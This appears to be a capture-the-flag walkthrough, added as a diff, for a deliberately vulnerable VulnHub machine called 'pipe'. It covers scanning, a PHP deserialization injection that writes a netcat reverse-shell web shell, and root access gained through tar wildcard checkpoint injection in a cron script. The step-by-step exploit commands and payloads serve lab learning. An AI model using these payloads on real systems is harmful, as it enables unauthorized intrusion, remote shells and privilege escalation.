@@ -1,0 +1,484 @@
+URL : https://www.vulnhub.com/entry/devrandom-pipe,124/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 192.168.116.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
+ _____________________________________________________________________________ 
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:ff:fc:d3    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.134 00:0c:29:46:c0:a6    01    060   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:ef:b8:c0    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.134
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-21 00:26 EST
+Nmap scan report for 192.168.174.134
+Host is up (0.00048s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp    open  http    Apache httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized
+|_  Basic realm=index.php
+|_http-methods: No Allow or Public header in OPTIONS response (status code 401)
+|_http-title: 401 Unauthorized
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          52559/udp  status
+|_  100024  1          56465/tcp  status
+56465/tcp open  status  1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          52559/udp  status
+|_  100024  1          56465/tcp  status
+MAC Address: 00:0C:29:46:C0:A6 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.48 ms 192.168.174.134
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
+root@kali:~# 
+
+3.) Run Dirbuster
+Running Dirbuster on http://192.168.174.134/ reveals 2 directories
+http://192.168.174.134/scriptz/
+log.php.BAK
+php.js
+http://192.168.174.134/images/
+pipe.jpg
+root@kali:~/Downloads# cat log.php.BAK 
+<?php
+class Log
+{
+    public $filename = '';
+    public $data = '';
+
+    public function __construct()
+    {
+        $this->filename = '';
+		$this->data = '';
+    }
+
+    public function PrintLog()
+    {
+        $pre = "[LOG]";
+		$now = date('Y-m-d H:i:s');
+
+        $str = '$pre - $now - $this->data';
+        eval("\$str = \"$str\";");
+        echo $str;
+    }
+
+    public function __destruct()
+    {
+	file_put_contents($this->filename, $this->data, FILE_APPEND);
+    }
+}
+?>
+root@kali:~/Downloads# 
+
+4.) In Browser and Burp
+In Burp
+GET /index.php HTTP/1.1
+Host: 192.168.174.134
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+Change to
+POST /index.php HTTP/1.1
+Host: 192.168.174.134
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+In Page source
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script src="scriptz/php.js"></script>
+<script>
+function submit_form() {
+var object = serialize({id: 1, firstname: 'Rene', surname: 'Margitte', artwork: 'The Treachery of Images'}); 
+object = object.substr(object.indexOf("{"),object.length);
+object = "O:4:\"Info\":4:" + object;
+document.forms[0].param.value = object;
+document.getElementById('info_form').submit();
+}
+</script> 
+<title>The Treachery of Images</title>
+</head>
+<h1><i>The Treachery of Images</i></h1>
+<hr />
+From Wikipedia, the free encyclopedia
+<br />
+<br />
+The Treachery of Images (French: La trahison des images, 1928–29, sometimes translated as The Treason of Images) is a painting by the Belgian surrealist painter René Magritte, painted when Magritte was 30 years old. The picture shows a pipe. Below it, Magritte painted, "Ceci n'est pas une pipe." [sə.si ne paz‿yn pip], French for "This is not a pipe."
+<p>
+"The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it's just a representation, is it not? So if I had written on my picture 'This is a pipe', I'd have been lying!"
+</p>
+His statement is taken to mean that the painting itself is not a pipe. The painting is merely an image of a pipe. Hence, the description, "this is not a pipe." The theme of pipes with the text "Ceci n'est pas une pipe" is extended in his 1966 painting, Les Deux Mystères. It is currently on display at the Los Angeles County Museum of Art.
+The painting is sometimes given as an example of meta message conveyed by paralanguage. Compare with Korzybski's "The word is not the thing" and "The map is not the territory".
+<br />
+<br />
+<center><div style="width:500px;overflow:hidden;" >
+   <img src="images/pipe.jpg" width="400px" height="auto" border="1">
+</div>
+<form action="index.php" id="info_form" method="POST">
+   <input type="hidden" name="param" value="" />
+   <a href="#" onclick="submit_form(); return false;">Show Artist Info.</a>
+</form></center>René François Ghislain Magritte (French: [magʁit]; 21 November 1898 – 15 August 1967) was a Belgian surrealist artist. He became well known for a number of witty and thought-provoking images that fall under the umbrella of surrealism. His work is known for challenging observers' preconditioned perceptions of reality.</html>
+
+-> There is a reference to scriptz/php.js
+http://192.168.174.134/scriptz/php.js
+function serialize(mixed_value) {
+  //  discuss at: http://phpjs.org/functions/serialize/
+  // original by: Arpad Ray (mailto:arpad@php.net)
+  // improved by: Dino
+  // improved by: Le Torbi (http://www.letorbi.de/)
+  // improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)
+  // bugfixed by: Andrej Pavlovic
+  // bugfixed by: Garagoth
+  // bugfixed by: Russell Walker (http://www.nbill.co.uk/)
+  // bugfixed by: Jamie Beck (http://www.terabit.ca/)
+  // bugfixed by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)
+  // bugfixed by: Ben (http://benblume.co.uk/)
+  //    input by: DtTvB (http://dt.in.th/2008-09-16.string-length-in-bytes.html)
+  //    input by: Martin (http://www.erlenwiese.de/)
+  //        note: We feel the main purpose of this function should be to ease the transport of data between php & js
+  //        note: Aiming for PHP-compatibility, we have to translate objects to arrays
+  //   example 1: serialize(['Kevin', 'van', 'Zonneveld']);
+  //   returns 1: 'a:3:{i:0;s:5:"Kevin";i:1;s:3:"van";i:2;s:9:"Zonneveld";}'
+  //   example 2: serialize({firstName: 'Kevin', midName: 'van', surName: 'Zonneveld'});
+  //   returns 2: 'a:3:{s:9:"firstName";s:5:"Kevin";s:7:"midName";s:3:"van";s:7:"surName";s:9:"Zonneveld";}'
+
+  var val, key, okey,
+    ktype = '',
+    vals = '',
+    count = 0,
+    _utf8Size = function(str) {
+      var size = 0,
+        i = 0,
+        l = str.length,
+        code = '';
+      for (i = 0; i < l; i++) {
+        code = str.charCodeAt(i);
+        if (code < 0x0080) {
+          size += 1;
+        } else if (code < 0x0800) {
+          size += 2;
+        } else {
+          size += 3;
+        }
+      }
+      return size;
+    },
+    _getType = function(inp) {
+      var match, key, cons, types, type = typeof inp;
+
+      if (type === 'object' && !inp) {
+        return 'null';
+      }
+
+      if (type === 'object') {
+        if (!inp.constructor) {
+          return 'object';
+        }
+        cons = inp.constructor.toString();
+        match = cons.match(/(\w+)\(/);
+        if (match) {
+          cons = match[1].toLowerCase();
+        }
+        types = ['boolean', 'number', 'string', 'array'];
+        for (key in types) {
+          if (cons == types[key]) {
+            type = types[key];
+            break;
+          }
+        }
+      }
+      return type;
+    },
+    type = _getType(mixed_value);
+
+  switch (type) {
+  case 'function':
+    val = '';
+    break;
+  case 'boolean':
+    val = 'b:' + (mixed_value ? '1' : '0');
+    break;
+  case 'number':
+    val = (Math.round(mixed_value) == mixed_value ? 'i' : 'd') + ':' + mixed_value;
+    break;
+  case 'string':
+    val = 's:' + _utf8Size(mixed_value) + ':"' + mixed_value + '"';
+    break;
+  case 'array':
+  case 'object':
+    val = 'a';
+    /*
+        if (type === 'object') {
+          var objname = mixed_value.constructor.toString().match(/(\w+)\(\)/);
+          if (objname == undefined) {
+            return;
+          }
+          objname[1] = this.serialize(objname[1]);
+          val = 'O' + objname[1].substring(1, objname[1].length - 1);
+        }
+        */
+
+    for (key in mixed_value) {
+      if (mixed_value.hasOwnProperty(key)) {
+        ktype = _getType(mixed_value[key]);
+        if (ktype === 'function') {
+          continue;
+        }
+
+        okey = (key.match(/^[0-9]+$/) ? parseInt(key, 10) : key);
+        vals += this.serialize(okey) + this.serialize(mixed_value[key]);
+        count++;
+      }
+    }
+    val += ':' + count + ':{' + vals + '}';
+    break;
+  case 'undefined':
+    // Fall-through
+  default:
+    // if the JS object has a property which contains a null value, the string cannot be unserialized by PHP
+    val = 'N';
+    break;
+  }
+  if (type !== 'object' && type !== 'array') {
+    val += ';';
+  }
+  return val;
+}
+
+In Burp
+POST /index.php HTTP/1.1
+Host: 192.168.174.134
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.174.134/index.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 225
+
+param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D
+
+After URL decode
+POST /index.php HTTP/1.1
+Host: 192.168.174.134
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.174.134/index.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 225
+
+param=O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}
+
+Change to
+POST /index.php HTTP/1.1
+Host: 192.168.174.134
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.174.134/index.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 225
+
+param=O:3:"Log":2:{s:8:"filename";s:32:"/var/www/html/scriptz/rshell.php";s:4:"data";s:54:"<?php passthru("nc -e /bin/sh 192.168.174.130 5555")?>";}
+
+root@kali:~# python
+Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> var = '/var/www/html/scriptz/rshell.php'
+>>> len(var)
+32
+>>> var2 = '<?php passthru("nc -e /bin/sh 192.168.174.130 5555")?>'
+>>> len(var2)
+54
+>>> 
+
+rshell.php has been uploaded to http://192.168.174.134/scriptz/
+
+5.) Setting up a reverse shell
+192.168.174.134/scriptz/rshell.php
+In Terminal
+root@kali:~# nc -nlvp 5555
+listening on [any] 5555 ...
+connect to [192.168.174.130] from (UNKNOWN) [192.168.174.134] 51446
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@pipe:/var/www/html/scriptz$ ls
+ls
+log.php.BAK  php.js  rshell.php
+www-data@pipe:/var/www/html/scriptz$ cd ..
+cd ..
+www-data@pipe:/var/www/html$ ls
+ls
+images	index.php  info.php  log.php  scriptz
+www-data@pipe:/var/www/html$ ls -lah
+ls -lah
+total 36K
+drwxr-xr-x 4 www-data www-data 4.0K Jul  9 13:49 .
+drwxr-xr-x 3 root     root     4.0K Jul  5 14:46 ..
+-rw-r--r-- 1 www-data www-data  137 Jul  6 02:43 .htaccess
+-rw-r--r-- 1 www-data www-data   43 Jul  6 09:33 .htpasswd
+drwxr-xr-x 2 www-data www-data 4.0K Jul  6 02:53 images
+-rw-r--r-- 1 www-data www-data 2.8K Jul  9 13:49 index.php
+-rw-r--r-- 1 www-data www-data  150 Jul  6 01:50 info.php
+-rw-r--r-- 1 www-data www-data  474 Jul  6 03:43 log.php
+drwxr-xr-x 2 www-data www-data 4.0K Nov 21 20:53 scriptz
+www-data@pipe:/var/www/html$ cat .htaccess
+cat .htaccess
+AuthUserFile /var/www/html/.htpasswd
+AuthName "index.php"
+AuthType Basic
+<Limit GET PUT HEAD OPTIONS DELETE>
+require valid-user
+</Limit>
+www-data@pipe:/var/www/html$ date
+date
+Sat Nov 21 20:55:57 AWST 2015
+www-data@pipe:/var/www/html$ cd /etc
+cd /etc
+www-data@pipe:/etc$ cat crontab
+cat crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root /root/create_backup.sh
+*/5 * * * * root /usr/bin/compress.sh
+www-data@pipe:/etc$ 
+www-data@pipe:/etc$ cat /root/create_backup.sh
+cat /root/create_backup.sh
+cat: /root/create_backup.sh: Permission denied
+www-data@pipe:/etc$ cat /usr/bin/compress.sh
+cat /usr/bin/compress.sh
+#!/bin/sh
+
+rm -f /home/rene/backup/backup.tar.gz
+cd /home/rene/backup
+tar cfz /home/rene/backup/backup.tar.gz *
+chown rene:rene /home/rene/backup/backup.tar.gz
+rm -f /home/rene/backup/*.BAK
+www-data@pipe:/etc$ 
+
+(*) wildcard is used and we have global write permission on the home folder
+http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+www-data@pipe:/home/rene/backup$ echo > --checkpoint=1;
+echo > --checkpoint=1;
+www-data@pipe:/home/rene/backup$ echo > --checkpoint-action=exec=sh\ shell.sh;
+<ckup$ echo > --checkpoint-action=exec=sh\ shell.sh;                         
+www-data@pipe:/home/rene/backup$ echo 'chmod u+s /bin/dash' > shell.sh
+echo 'chmod u+s /bin/dash' > shell.sh
+www-data@pipe:/home/rene/backup$ chmod +x shell.sh
+chmod +x shell.sh
+www-data@pipe:/home/rene/backup$ 
+www-data@pipe:/home/rene/backup$ /bin/dash
+/bin/dash
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+create_backup.sh  flag.txt
+# cat flag.txt
+cat flag.txt
+                                                                   .aMMMMMMMMn.  ,aMMMMn.
+                                                                 .aMccccccccc*YMMn.    `Mb
+                                                                aMccccccccccccccc*Mn    MP
+                                                               .AMMMMn.   MM `*YMMY*ccaM*
+                                                              dM*  *YMMb  YP        `cMY
+                                                              YM.  .dMMP   aMn.     .cMP
+                                                               *YMMn.     aMMMMMMMMMMMY'
+                                                                .'YMMb.           ccMP
+                                                             .dMcccccc*Mc....cMb.cMP'
+                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
+                                                          dY*'  '*M;ccccMM..dMMM..MP*cc*Mb
+                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
+                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
+                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
+                                                          Yb;cc;dMMMMMMMMMMMP*'  *YMMP*
+                                                           *YMMMPYMMMMMMP*'          curchack
+                                                       +####################################+
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       +----------------------------------+-+
+                                                        ####################################
+                                                             |======                  |
+                                                             |======                  |
+                                                             |=====                   |
+                                                             |====                    |
+                                                             |                        |
+                                                             +                        +
+
+ .d8888b.                 d8b          d8b               888                                                                    d8b
+d88P  Y88b                Y8P          88P               888                                                                    Y8P
+888    888                             8P                888
+888        .d88b.  .d8888b888   88888b."  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
+888       d8P  Y8bd88P"   888   888 "88b d8P  Y8b88K     888      888 "88b    "88b88K        888  888888 "88bd8P  Y8b   888 "88b888888 "88bd8P  Y8b
+888    88888888888888     888   888  888 88888888"Y8888b.888      888  888.d888888"Y8888b.   888  888888  88888888888   888  888888888  88888888888
+Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
+ "Y8888P"  "Y8888  "Y8888P888   888  888  "Y8888  88888P' "Y888   88888P" "Y888888 88888P'    "Y88888888  888 "Y8888    88888P" 88888888P"  "Y8888Y8P
+                                                                  888                                                   888        888
+                                                                  888                                                   888        888
+                                                                  888                                                   888        888
+Well Done!
+Here's your flag: 0089cd4f9ae79402cdd4e7b8931892b7
+
+# 
